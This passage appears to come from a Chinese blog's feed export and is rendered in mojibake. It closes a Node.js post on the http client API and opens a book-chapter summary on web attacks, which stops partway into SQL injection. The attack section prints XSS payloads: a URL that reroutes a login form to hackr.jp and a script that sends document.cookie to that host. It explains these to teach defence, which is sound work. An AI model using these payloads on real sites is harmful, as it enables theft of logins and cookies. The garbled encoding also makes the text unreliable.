ç»“æŸå“åº”ï¼Œå‘ŠçŸ¥å®¢æˆ·ç«¯æ‰€æœ‰å‘é€å·²ç»å®Œæˆã€‚å½“æ‰€æœ‰è¦è¿”å›žçš„å†…å®¹å‘é€å®Œæ¯•çš„æ—¶å€™ï¼Œè¯¥å‡½æ•° å¿…é¡» è¢«è°ƒç”¨ä¸€æ¬¡ã€‚å®ƒæŽ¥å—ä¸¤ä¸ªå¯é€‰å‚æ•°ï¼Œæ„ä¹‰å’Œ response.write ç›¸åŒã€‚å¦‚æžœä¸è°ƒç”¨è¯¥å‡½æ•°ï¼Œå®¢æˆ·ç«¯å°†æ°¸è¿œå¤„äºŽç­‰å¾…çŠ¶æ€ã€‚ HTTP å®¢æˆ·ç«¯http æ¨¡å—æä¾›äº†ä¸¤ä¸ªå‡½æ•° http.request å’Œ http.get ï¼ŒåŠŸèƒ½æ˜¯ä½œä¸ºå®¢æˆ·ç«¯å‘ HTTPæœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚ http.request(options, callback)å‘èµ· HTTP è¯·æ±‚ï¼ŒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œoptionæ˜¯ä¸€ä¸ªç±»ä¼¼å…³è”æ•°ç»„çš„å¯¹è±¡ï¼Œè¡¨ç¤ºè¯·æ±‚çš„å‚æ•°ï¼Œ callback æ˜¯è¯·æ±‚å›žè°ƒçš„å‡½æ•°ã€‚ optionå¸¸è§çš„å‚æ•°å¦‚ä¸‹ã€‚ host ï¼šè¯·æ±‚ç½‘ç«™çš„åŸŸåæˆ– IP åœ°å€ã€‚ portï¼šè¯·æ±‚ç½‘ç«™çš„ç«¯å£ methodï¼šè¯·æ±‚æ–¹æ³•ï¼Œé»˜è®¤GET pathï¼šè¯·æ±‚çš„ç›¸å¯¹äºŽæ ¹çš„è·¯å¾„ï¼Œé»˜è®¤æ˜¯â€œ/â€ã€‚ QueryString åº”è¯¥åŒ…å«åœ¨å…¶ä¸­ã€‚ä¾‹å¦‚ /search?query=lbhã€‚ headersï¼šä¸€ä¸ªå…³è”æ•°ç»„å¯¹è±¡ï¼Œä¸ºè¯·æ±‚å¤´çš„å†…å®¹ã€‚ callback ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œä¸º http.ClientResponse çš„å®žä¾‹ã€‚ http.request è¿”å›žä¸€ä¸ª http.ClientRequest çš„å®žä¾‹ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªé€šè¿‡ http.request å‘é€ POST è¯·æ±‚çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627// httprequest.jsvar http = require('http');var querystring = require('querystring');var contents = querystring.stringify(&#123; name: 'lbh', email: '544289495@qq.com', address: 'xxx xx xxx'&#125;)var options = &#123; host: 'www.xxx.com', path: '/application/node/post.php', method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': contents.length &#125;&#125;var req = http.request(options, function(res) &#123; res.setEncoding('utf-8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;)req.write(contents);req.end(); // ä¸è¦å¿˜äº†é€šè¿‡ req.end() ç»“æŸè¯·æ±‚ï¼Œå¦åˆ™æœåŠ¡å™¨å°†ä¸ä¼šæ”¶åˆ°ä¿¡æ¯ã€‚ http.get(options, callback) httpæ¨¡å—è¿˜æä¾›äº†ä¸€ä¸ªæ›´åŠ ç®€ä¾¿çš„æ–¹æ³•ç”¨äºŽå¤„ç†GET è¯·æ±‚ï¼š http.getã€‚å®ƒæ˜¯ http.requestçš„ç®€åŒ–ç‰ˆï¼Œå”¯ä¸€åŒºåˆ«åœ¨äºŽ http.getè‡ªåŠ¨å°†è¯·æ±‚æ–¹æ³•è®¾ä¸ºäº†GETè¯·æ±‚ï¼ŒåŒæ—¶ä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨ req.end() 12345678910// httpget.jsvar http = require('http');http.get(&#123; host: 'www.xxx.com'&#125;, function(res) &#123; res.setEncoding('utf8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;); http.ClientRequesthttp.ClientRequest æ˜¯ç”± http.request æˆ– http.get è¿”å›žäº§ç”Ÿçš„å¯¹è±¡ï¼Œè¡¨ç¤ºä¸€ä¸ªå·²ç»äº§ç”Ÿè€Œä¸”æ­£åœ¨è¿›è¡Œä¸­çš„ HTTP è¯·æ±‚ã€‚å®ƒæä¾›ä¸€ä¸ª response äº‹ä»¶ï¼Œå³ http.requestæˆ– http.get ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šçš„å›žè°ƒå‡½æ•°çš„ç»‘å®šå¯¹è±¡ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æ˜¾å¼åœ°ç»‘å®šè¿™ä¸ªäº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼š 123456789101112// httpresponse.jsvar http = require('http');var req = http.get(&#123; host: 'www.xxx.com'&#125;);req.on('response', function(res) &#123; res.setEncoding('utf8'); res.on('data', function(data) &#123; console.log(data); &#125;);&#125;); http.ClientRequest åƒ http.ServerResponse ä¸€æ ·ä¹Ÿæä¾›äº† write å’Œ end å‡½æ•°ï¼Œç”¨äºŽå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ä½“ï¼Œé€šå¸¸ç”¨äºŽ POSTã€PUT ç­‰æ“ä½œã€‚æ‰€æœ‰å†™ç»“æŸä»¥åŽå¿…é¡»è°ƒç”¨ endå‡½æ•°ä»¥é€šçŸ¥æœåŠ¡å™¨ï¼Œå¦åˆ™è¯·æ±‚æ— æ•ˆã€‚ http.ClientRequest è¿˜æä¾›äº†ä»¥ä¸‹å‡½æ•°ã€‚ request.abort() ï¼šç»ˆæ­¢æ­£åœ¨å‘é€çš„è¯·æ±‚ã€‚ request.setTimeout(timeout, [callback]) ï¼šè®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼Œ timeout ä¸ºæ¯«ç§’æ•°ã€‚å½“è¯·æ±‚è¶…æ—¶ä»¥åŽï¼Œ callback å°†ä¼šè¢«è°ƒç”¨ã€‚ æ­¤å¤–è¿˜æœ‰ request.setNoDelay([noDelay]) ã€ request.setSocketKeepAlive([enable] , [initialDelay]) ç­‰å‡½æ•°ï¼Œå…·ä½“å†…å®¹è¯·å‚è§ Node.js æ–‡æ¡£ã€‚ http.ClientResponsehttp.ClientResponse ä¸Ž http.ServerRequest ç›¸ä¼¼ï¼Œæä¾›äº†ä¸‰ä¸ªäº‹ä»¶ data ã€ end å’Œ close ï¼Œåˆ†åˆ«åœ¨æ•°æ®åˆ°è¾¾ã€ä¼ è¾“ç»“æŸå’Œè¿žæŽ¥ç»“æŸæ—¶è§¦å‘ï¼Œå…¶ä¸­ data äº‹ä»¶ä¼ é€’ä¸€ä¸ªå‚æ•° chunk ï¼Œè¡¨ç¤ºæŽ¥æ”¶åˆ°çš„æ•°æ®ã€‚ http.ClientResponse ä¹Ÿæä¾›äº†ä¸€äº›å±žæ€§ï¼Œç”¨äºŽè¡¨ç¤ºè¯·æ±‚çš„ç»“æžœçŠ¶æ€,å¦‚ä¸‹è¡¨ å ç§° å« ä¹‰ statusCode HTTP çŠ¶æ€ç ï¼Œå¦‚ 200ã€404ã€500 httpVersion HTTP åè®®ç‰ˆæœ¬ï¼Œé€šå¸¸æ˜¯ 1.0 æˆ– 1.1 headers HTTP è¯·æ±‚å¤´ trailers HTTP è¯·æ±‚å°¾ï¼ˆä¸å¸¸è§ï¼‰ http.ClientResponse è¿˜æä¾›äº†ä»¥ä¸‹å‡ ä¸ªç‰¹æ®Šçš„å‡½æ•°ã€‚ response.setEncoding([encoding]) ï¼šè®¾ç½®é»˜è®¤çš„ç¼–ç ï¼Œå½“ data äº‹ä»¶è¢«è§¦å‘æ—¶ï¼Œæ•°æ®å°†ä¼šä»¥ encoding ç¼–ç ã€‚é»˜è®¤å€¼æ˜¯ null ï¼Œå³ä¸ç¼–ç ï¼Œä»¥ Buffer çš„å½¢å¼å­˜å‚¨ã€‚å¸¸ç”¨ç¼–ç ä¸º utf8ã€‚ response.pause() ï¼šæš‚åœæŽ¥æ”¶æ•°æ®å’Œå‘é€äº‹ä»¶ï¼Œæ–¹ä¾¿å®žçŽ°ä¸‹è½½åŠŸèƒ½ã€‚ response.resume() ï¼šä»Žæš‚åœçš„çŠ¶æ€ä¸­æ¢å¤ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬åä¸€ç« ï¼‰â€”â€” Web çš„æ”»å‡»æŠ€æœ¯]]></title>
    <url>%2F2018-09-18-read-%E5%9B%BE%E8%A7%A3HTTP-Part11.html</url>
    <content type="text"><![CDATA[ä¸çŸ¥ä¸è§‰ï¼Œå·²ç»åˆ°äº†è¿™æœ¬ä¹¦çš„æœ€åŽä¸€ç« äº†ï¼Œè¿™æœ¬ä¹¦æ•´ä½“çœ‹ä¸‹æ¥ï¼Œæ„Ÿè§‰æŒºé€šä¿—æ˜“æ‡‚çš„ï¼Œå°±æ˜¯å…¶ä¸­ä¸€äº›æ ‡å‡†æœ‰äº›è¿‡æ—¶ï¼Œæ¯•ç«Ÿä¹Ÿæ˜¯å¾ˆä¹…å‰çš„ä¹¦ç±ã€‚çœ‹å®Œ http ç›¸å…³çš„ä¹‹åŽï¼ŒåŽé¢çš„æ—¶é—´éƒ½æ‹¿æ¥å­¦ä¹  nodeJsä»¥åŠjsæ•°æ®ç»“æž„ç®—æ³•ç›¸å…³çš„ã€‚åœ¨å½“å½“ç½‘å¼€å­¦å­£ä¹°çš„ä¹¦ï¼Œåªå¼€å°äº†ä¸€æœ¬ã€Šæž•è¾¹ç®—æ³•ä¹¦ã€‹ï¼Œã€Šä½ ä¸çŸ¥é“çš„javaScriptã€‹ç³»åˆ—ä¸‰æœ¬ç­‰å¾…å¼€å°â€¦ ç¬¬åä¸€ç«  Web çš„æ”»å‡»æŠ€æœ¯äº’è”ç½‘ä¸Šçš„æ”»å‡»å¤§éƒ½å°† Web ç«™ç‚¹ä½œä¸ºç›®æ ‡ã€‚æœ¬ç« è®²è§£å…·ä½“æœ‰å“ªäº›æ”»å‡» Web ç«™ç‚¹çš„æ‰‹æ®µï¼Œä»¥åŠæ”»å‡»ä¼šé€ æˆæ€Žæ ·çš„å½±å“ã€‚ é’ˆå¯¹ Web çš„æ”»å‡»æŠ€æœ¯ç®€å•çš„ HTTP åè®®æœ¬èº«å¹¶ä¸å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œå› æ­¤åè®®æœ¬èº«å‡ ä¹Žä¸ä¼šæˆä¸ºæ”»å‡»çš„å¯¹è±¡ã€‚åº”ç”¨ HTTP åè®®çš„æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ï¼Œä»¥åŠè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ Web åº”ç”¨ç­‰èµ„æºæ‰æ˜¯æ”»å‡»ç›®æ ‡ã€‚ HTTP ä¸å…·å¤‡å¿…è¦çš„å®‰å…¨åŠŸèƒ½çŽ°ä»Šçš„ Web ç½‘ç«™åº”ç”¨çš„ HTTP åè®®çš„ä½¿ç”¨æ–¹å¼å·²å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ã€‚å‡ ä¹ŽçŽ°ä»Šæ‰€æœ‰çš„ Web ç½‘ç«™éƒ½ä¼šä½¿ç”¨ä¼šè¯ï¼ˆsessionï¼‰ç®¡ç†ã€åŠ å¯†å¤„ç†ç­‰å®‰å…¨æ€§æ–¹é¢çš„åŠŸèƒ½ï¼Œè€Œ HTTP åè®®å†…å¹¶ä¸å…·å¤‡è¿™äº›åŠŸèƒ½ã€‚ä»Žæ•´ä½“ä¸Šçœ‹ï¼ŒHTTP å°±æ˜¯ä¸€ä¸ªé€šç”¨çš„å•çº¯åè®®æœºåˆ¶ã€‚å› æ­¤å®ƒå…·å¤‡è¾ƒå¤šä¼˜åŠ¿ï¼Œä½†æ˜¯åœ¨å®‰å…¨æ€§æ–¹é¢åˆ™å‘ˆåŠ£åŠ¿ã€‚ å°±æ‹¿è¿œç¨‹ç™»å½•æ—¶ä¼šç”¨åˆ°çš„ SSH åè®®æ¥è¯´ï¼ŒSSH å…·å¤‡åè®®çº§åˆ«çš„è®¤è¯åŠä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ï¼ŒHTTP åè®®åˆ™æ²¡æœ‰ã€‚å¦å¤–åœ¨æž¶è®¾ SSH æœåŠ¡æ–¹é¢ï¼Œä»»ä½•äººéƒ½å¯ä»¥è½»æ˜“åœ°åˆ›å»ºå®‰å…¨ç­‰çº§é«˜çš„æœåŠ¡ï¼Œè€Œ HTTP å³ä½¿å·²æž¶è®¾å¥½æœåŠ¡å™¨ï¼Œä½†è‹¥æƒ³æä¾›æœåŠ¡å™¨åŸºç¡€ä¸Šçš„ Web åº”ç”¨ï¼Œå¾ˆå¤šæƒ…å†µä¸‹éƒ½éœ€è¦é‡æ–°å¼€å‘ã€‚ å› æ­¤ï¼Œå¼€å‘è€…éœ€è¦è‡ªè¡Œè®¾è®¡å¹¶å¼€å‘è®¤è¯åŠä¼šè¯ç®¡ç†åŠŸèƒ½æ¥æ»¡è¶³ Webåº”ç”¨çš„å®‰å…¨ã€‚è€Œè‡ªè¡Œè®¾è®¡å°±æ„å‘³ç€ä¼šå‡ºçŽ°å„ç§å½¢å½¢è‰²è‰²çš„å®žçŽ°ã€‚ç»“æžœï¼Œå®‰å…¨ç­‰çº§å¹¶ä¸å®Œå¤‡ï¼Œå¯ä»åœ¨è¿ä½œçš„ Web åº”ç”¨èƒŒåŽå´éšè—ç€å„ç§å®¹æ˜“è¢«æ”»å‡»è€…æ»¥ç”¨çš„å®‰å…¨æ¼æ´žçš„ Bugã€‚ åœ¨å®¢æˆ·ç«¯å³å¯ç¯¡æ”¹è¯·æ±‚åœ¨ Web åº”ç”¨ä¸­ï¼Œä»Žæµè§ˆå™¨é‚£æŽ¥æ”¶åˆ°çš„ HTTP è¯·æ±‚çš„å…¨éƒ¨å†…å®¹ï¼Œéƒ½å¯ä»¥åœ¨å®¢æˆ·ç«¯è‡ªç”±åœ°å˜æ›´ã€ç¯¡æ”¹ã€‚æ‰€ä»¥ Web åº”ç”¨å¯èƒ½ä¼šæŽ¥æ”¶åˆ°ä¸Žé¢„æœŸæ•°æ®ä¸ç›¸åŒçš„å†…å®¹ã€‚ åœ¨ HTTP è¯·æ±‚æŠ¥æ–‡å†…åŠ è½½æ”»å‡»ä»£ç ï¼Œå°±èƒ½å‘èµ·å¯¹ Web åº”ç”¨çš„æ”»å‡»ã€‚é€šè¿‡ URL æŸ¥è¯¢å­—æ®µæˆ–è¡¨å•ã€HTTP é¦–éƒ¨ã€Cookie ç­‰é€”å¾„æŠŠæ”»å‡»ä»£ç ä¼ å…¥ï¼Œè‹¥è¿™æ—¶ Web åº”ç”¨å­˜åœ¨å®‰å…¨æ¼æ´žï¼Œé‚£å†…éƒ¨ä¿¡æ¯å°±ä¼šé­åˆ°çªƒå–ï¼Œæˆ–è¢«æ”»å‡»è€…æ‹¿åˆ°ç®¡ç†æƒé™ã€‚ é’ˆå¯¹ Web åº”ç”¨çš„æ”»å‡»æ¨¡å¼å¯¹ Web åº”ç”¨çš„æ”»å‡»æ¨¡å¼æœ‰ä»¥ä¸‹ä¸¤ç§ã€‚ ä»¥æœåŠ¡å™¨ä¸ºç›®æ ‡çš„ä¸»åŠ¨æ”»å‡» ä¸»åŠ¨æ”»å‡»ï¼ˆactive attackï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡ç›´æŽ¥è®¿é—® Web åº”ç”¨ï¼ŒæŠŠæ”»å‡»ä»£ç ä¼ å…¥çš„æ”»å‡»æ¨¡å¼ã€‚ç”±äºŽè¯¥æ¨¡å¼æ˜¯ç›´æŽ¥é’ˆå¯¹æœåŠ¡å™¨ä¸Šçš„èµ„æºè¿›è¡Œæ”»å‡»ï¼Œå› æ­¤æ”»å‡»è€…éœ€è¦èƒ½å¤Ÿè®¿é—®åˆ°é‚£äº›èµ„æºã€‚ä¸»åŠ¨æ”»å‡»æ¨¡å¼é‡Œå…·æœ‰ä»£è¡¨æ€§çš„æ”»å‡»æ˜¯ SQL æ³¨å…¥æ”»å‡»å’Œ OS å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚ ä»¥æœåŠ¡å™¨ä¸ºç›®æ ‡çš„è¢«åŠ¨æ”»å‡» è¢«åŠ¨æ”»å‡»ï¼ˆpassive attackï¼‰æ˜¯æŒ‡åˆ©ç”¨åœˆå¥—ç­–ç•¥æ‰§è¡Œæ”»å‡»ä»£ç çš„æ”»å‡»æ¨¡å¼ã€‚åœ¨è¢«åŠ¨æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…ä¸ç›´æŽ¥å¯¹ç›®æ ‡ Web åº”ç”¨è®¿é—®å‘èµ·æ”»å‡»ã€‚ è¢«åŠ¨æ”»å‡»é€šå¸¸çš„æ”»å‡»æ¨¡å¼å¦‚ä¸‹æ‰€ç¤ºã€‚ æ­¥éª¤ 1ï¼š æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·è§¦å‘å·²è®¾ç½®å¥½çš„é™·é˜±ï¼Œè€Œé™·é˜±ä¼šå¯åŠ¨å‘é€å·²åµŒå…¥æ”»å‡»ä»£ç çš„ HTTP è¯·æ±‚ã€‚ æ­¥éª¤ 2ï¼š å½“ç”¨æˆ·ä¸çŸ¥ä¸è§‰ä¸­æ‹›ä¹‹åŽï¼Œç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯å°±ä¼šè§¦å‘è¿™ä¸ªé™·é˜±ã€‚ æ­¥éª¤ 3ï¼š ä¸­æ‹›åŽçš„ç”¨æˆ·æµè§ˆå™¨ä¼šæŠŠå«æœ‰æ”»å‡»ä»£ç çš„ HTTP è¯·æ±‚å‘é€ç»™ä½œä¸ºæ”»å‡»ç›®æ ‡çš„ Web åº”ç”¨ï¼Œè¿è¡Œæ”»å‡»ä»£ç ã€‚ æ­¥éª¤ 4ï¼š æ‰§è¡Œå®Œæ”»å‡»ä»£ç ï¼Œå­˜åœ¨å®‰å…¨æ¼æ´žçš„ Web åº”ç”¨ä¼šæˆä¸ºæ”»å‡»è€…çš„è·³æ¿ï¼Œå¯èƒ½å¯¼è‡´ç”¨æˆ·æ‰€æŒçš„ Cookie ç­‰ä¸ªäººä¿¡æ¯è¢«çªƒå–ï¼Œç™»å½•çŠ¶æ€ä¸­çš„ç”¨æˆ·æƒé™é­æ¶æ„æ»¥ç”¨ç­‰åŽæžœã€‚ è¢«åŠ¨æ”»å‡»æ¨¡å¼ä¸­å…·æœ‰ä»£è¡¨æ€§çš„æ”»å‡»æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»å’Œè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ã€‚ å¦å¤–è¿˜æœ‰åˆ©ç”¨ç”¨æˆ·çš„èº«ä»½æ”»å‡»ä¼ä¸šå†…éƒ¨ç½‘ç»œ åˆ©ç”¨è¢«åŠ¨æ”»å‡»ï¼Œå¯å‘èµ·å¯¹åŽŸæœ¬ä»Žäº’è”ç½‘ä¸Šæ— æ³•ç›´æŽ¥è®¿é—®çš„ä¼ä¸šå†…ç½‘ç­‰ç½‘ç»œçš„æ”»å‡»ã€‚åªè¦ç”¨æˆ·è¸å…¥æ”»å‡»è€…é¢„å…ˆè®¾å¥½çš„é™·é˜±ï¼Œåœ¨ç”¨æˆ·èƒ½å¤Ÿè®¿é—®åˆ°çš„ç½‘ç»œèŒƒå›´å†…ï¼Œå³ä½¿æ˜¯ä¼ä¸šå†…ç½‘ä¹ŸåŒæ ·ä¼šå—åˆ°æ”»å‡»ã€‚ å¾ˆå¤šä¼ä¸šå†…ç½‘ä¾ç„¶å¯ä»¥è¿žæŽ¥åˆ°äº’è”ç½‘ä¸Šï¼Œè®¿é—® Web ç½‘ç«™ï¼Œæˆ–æŽ¥æ”¶äº’è”ç½‘å‘æ¥çš„é‚®ä»¶ã€‚è¿™æ ·å°±å¯èƒ½ç»™æ”»å‡»è€…ä»¥å¯ä¹˜ä¹‹æœºï¼Œè¯±å¯¼ç”¨æˆ·è§¦å‘é™·é˜±åŽå¯¹ä¼ä¸šå†…ç½‘å‘åŠ¨æ”»å‡»ã€‚ å› è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨å¼•å‘çš„å®‰å…¨æ¼æ´žå®žæ–½ Web åº”ç”¨çš„å®‰å…¨å¯¹ç­–å¯å¤§è‡´åˆ†ä¸ºä»¥ä¸‹ä¸¤éƒ¨åˆ†ã€‚ å®¢æˆ·ç«¯çš„éªŒè¯ Web åº”ç”¨ç«¯ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰çš„éªŒè¯ è¾“å…¥å€¼éªŒè¯ è¾“å‡ºå€¼è½¬ä¹‰ å¤šæ•°æƒ…å†µä¸‹é‡‡ç”¨ JavaScript åœ¨å®¢æˆ·ç«¯éªŒè¯æ•°æ®ã€‚å¯æ˜¯åœ¨å®¢æˆ·ç«¯å…è®¸ç¯¡æ”¹æ•°æ®æˆ–å…³é—­ JavaScriptï¼Œä¸é€‚åˆå°† JavaScript éªŒè¯ä½œä¸ºå®‰å…¨çš„é˜²èŒƒå¯¹ç­–ã€‚ä¿ç•™å®¢æˆ·ç«¯éªŒè¯åªæ˜¯ä¸ºäº†å°½æ—©åœ°è¾¨è¯†è¾“å…¥é”™è¯¯ï¼Œèµ·åˆ°æé«˜ UIä½“éªŒçš„ä½œç”¨ã€‚ Web åº”ç”¨ç«¯çš„è¾“å…¥å€¼éªŒè¯æŒ‰ Web åº”ç”¨å†…çš„å¤„ç†åˆ™æœ‰å¯èƒ½è¢«è¯¯è®¤ä¸ºæ˜¯å…·æœ‰æ”»å‡»æ€§æ„ä¹‰çš„ä»£ç ã€‚è¾“å…¥å€¼éªŒè¯é€šå¸¸æ˜¯æŒ‡æ£€æŸ¥æ˜¯å¦æ˜¯ç¬¦åˆç³»ç»Ÿä¸šåŠ¡é€»è¾‘çš„æ•°å€¼æˆ–æ£€æŸ¥å­—ç¬¦ç¼–ç ç­‰é¢„é˜²å¯¹ç­–ã€‚ ä»Žæ•°æ®åº“æˆ–æ–‡ä»¶ç³»ç»Ÿã€HTMLã€é‚®ä»¶ç­‰è¾“å‡º Web åº”ç”¨å¤„ç†çš„æ•°æ®ä¹‹é™…ï¼Œé’ˆå¯¹è¾“å‡ºåšå€¼è½¬ä¹‰å¤„ç†æ˜¯ä¸€é¡¹è‡³å…³é‡è¦çš„å®‰å…¨ç­–ç•¥ã€‚å½“è¾“å‡ºå€¼è½¬ä¹‰ä¸å®Œå…¨æ—¶ï¼Œä¼šå› è§¦å‘æ”»å‡»è€…ä¼ å…¥çš„æ”»å‡»ä»£ç ï¼Œè€Œç»™è¾“å‡ºå¯¹è±¡å¸¦æ¥æŸå®³ã€‚ è·¨ç«™è„šæœ¬æ”»å‡»è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯æŒ‡é€šè¿‡å­˜åœ¨å®‰å…¨æ¼æ´žçš„Web ç½‘ç«™æ³¨å†Œç”¨æˆ·çš„æµè§ˆå™¨å†…è¿è¡Œéžæ³•çš„ HTML æ ‡ç­¾æˆ– JavaScript è¿›è¡Œçš„ä¸€ç§æ”»å‡»ã€‚åŠ¨æ€åˆ›å»ºçš„ HTML éƒ¨åˆ†æœ‰å¯èƒ½éšè—ç€å®‰å…¨æ¼æ´žã€‚å°±è¿™æ ·ï¼Œæ”»å‡»è€…ç¼–å†™è„šæœ¬è®¾ä¸‹é™·é˜±ï¼Œç”¨æˆ·åœ¨è‡ªå·±çš„æµè§ˆå™¨ä¸Šè¿è¡Œæ—¶ï¼Œä¸€ä¸å°å¿ƒå°±ä¼šå—åˆ°è¢«åŠ¨æ”»å‡»ã€‚ è·¨ç«™è„šæœ¬æ”»å‡»æœ‰å¯èƒ½é€ æˆä»¥ä¸‹å½±å“ã€‚ åˆ©ç”¨è™šå‡è¾“å…¥è¡¨å•éª—å–ç”¨æˆ·ä¸ªäººä¿¡æ¯ã€‚ åˆ©ç”¨è„šæœ¬çªƒå–ç”¨æˆ·çš„ Cookie å€¼ï¼Œè¢«å®³è€…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå¸®åŠ©æ”»å‡»è€…å‘é€æ¶æ„è¯·æ±‚ã€‚ æ˜¾ç¤ºä¼ªé€ çš„æ–‡ç« æˆ–å›¾ç‰‡ã€‚ XSS æ˜¯æ”»å‡»è€…åˆ©ç”¨é¢„å…ˆè®¾ç½®çš„é™·é˜±è§¦å‘çš„è¢«åŠ¨æ”»å‡»ã€‚ è·¨ç«™è„šæœ¬æ”»å‡»å±žäºŽè¢«åŠ¨æ”»å‡»æ¨¡å¼ï¼Œå› æ­¤æ”»å‡»è€…ä¼šäº‹å…ˆå¸ƒç½®å¥½ç”¨äºŽæ”»å‡»çš„é™·é˜±ã€‚ ä¸‹å›¾ç½‘ç«™é€šè¿‡åœ°å€æ ä¸­ URI çš„æŸ¥è¯¢å­—æ®µæŒ‡å®š IDï¼Œå³ç›¸å½“äºŽåœ¨è¡¨å•å†…è‡ªåŠ¨å¡«å†™å­—ç¬¦ä¸²çš„åŠŸèƒ½ã€‚è€Œå°±åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œéšè—ç€å¯æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»çš„æ¼æ´žã€‚ å……åˆ†ç†ŸçŸ¥æ­¤å¤„æ¼æ´žç‰¹ç‚¹çš„æ”»å‡»è€…ï¼ŒäºŽæ˜¯å°±åˆ›å»ºäº†ä¸‹é¢è¿™æ®µåµŒå…¥æ¶æ„ä»£ç çš„ URLã€‚å¹¶éšè—æ¤å…¥äº‹å…ˆå‡†å¤‡å¥½çš„æ¬ºè¯ˆé‚®ä»¶ä¸­æˆ– Web é¡µé¢å†…ï¼Œè¯±ä½¿ç”¨æˆ·åŽ»ç‚¹å‡»è¯¥ URLã€‚ 1http://example.jp/login?ID=&gt;&lt;script&gt;var f=document.getElementById(login); f.action=http://hackr.jp/pwget; f.method=get;&lt;/script&gt;&lt;span s= æµè§ˆå™¨æ‰“å¼€è¯¥ URI åŽï¼Œç›´è§‚æ„Ÿè§‰æ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–ï¼Œä½†è®¾ç½®å¥½çš„è„šæœ¬å´å·å·å¼€å§‹è¿è¡Œäº†ã€‚å½“ç”¨æˆ·åœ¨è¡¨å•å†…è¾“å…¥ ID å’Œå¯†ç ä¹‹åŽï¼Œå°±ä¼šç›´æŽ¥å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼ˆä¹Ÿå°±æ˜¯ hackr.jpï¼‰ï¼Œå¯¼è‡´ä¸ªäººç™»å½•ä¿¡æ¯è¢«çªƒå–ã€‚ ä¹‹åŽï¼ŒID åŠå¯†ç ä¼šä¼ ç»™è¯¥æ­£è§„ç½‘ç«™ï¼Œè€ŒæŽ¥ä¸‹æ¥ä»ç„¶æ˜¯æŒ‰æ­£å¸¸ç™»å½•æ­¥éª¤ï¼Œç”¨æˆ·å¾ˆéš¾æ„è¯†åˆ°è‡ªå·±çš„ç™»å½•ä¿¡æ¯å·²é­æ³„éœ²ã€‚ å¯¹ç”¨æˆ· Cookie çš„çªƒå–æ”»å‡» é™¤äº†åœ¨è¡¨å•ä¸­è®¾ä¸‹åœˆå¥—ä¹‹å¤–ï¼Œä¸‹é¢é‚£ç§æ¶æ„æž„é€ çš„è„šæœ¬åŒæ ·èƒ½å¤Ÿä»¥è·¨ç«™è„šæœ¬æ”»å‡»çš„æ–¹å¼ï¼Œçªƒå–åˆ°ç”¨æˆ·çš„ Cookie ä¿¡æ¯ã€‚ 1&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt; è¯¥è„šæœ¬å†…æŒ‡å®šçš„ http://hackr.jp/xss.js æ–‡ä»¶ã€‚å³ä¸‹é¢è¿™æ®µé‡‡ç”¨ JavaScript ç¼–å†™çš„ä»£ç ã€‚ 1234var content = escape(document.cookie);document.write("&lt;img src=http://hackr.jp/?");document.write(content);document.write("&gt;"); åœ¨å­˜åœ¨å¯è·¨ç«™è„šæœ¬æ”»å‡»å®‰å…¨æ¼æ´žçš„ Web åº”ç”¨ä¸Šæ‰§è¡Œä¸Šé¢è¿™æ®µJavaScript ç¨‹åºï¼Œå³å¯è®¿é—®åˆ°è¯¥ Web åº”ç”¨æ‰€å¤„åŸŸåä¸‹çš„ Cookie ä¿¡æ¯ã€‚ç„¶ åŽè¿™äº›ä¿¡æ¯ä¼šå‘é€è‡³æ”»å‡»è€…çš„ Web ç½‘ç«™ï¼ˆhttp://hackr.jp/ï¼‰ï¼Œè®°å½•åœ¨ä»–çš„ç™»å½•æ—¥å¿—ä¸­ã€‚ç»“æžœï¼Œæ”»å‡»è€…å°±è¿™æ ·çªƒå–åˆ°ç”¨æˆ·çš„ Cookie ä¿¡æ¯äº†ã€‚ SQL æ³¨å…¥æ”»å‡»ä¼šæ‰§è¡Œéžæ³• SQL çš„ SQL æ³¨å…¥æ”»å‡» SQL æ³¨å…¥ï¼ˆSQL Injectionï¼‰æ˜¯æŒ‡é’ˆå¯¹ Web åº”ç”¨ä½¿ç”¨çš„æ•°æ®åº“ï¼Œé€šè¿‡è¿è¡Œéžæ³•çš„ SQL 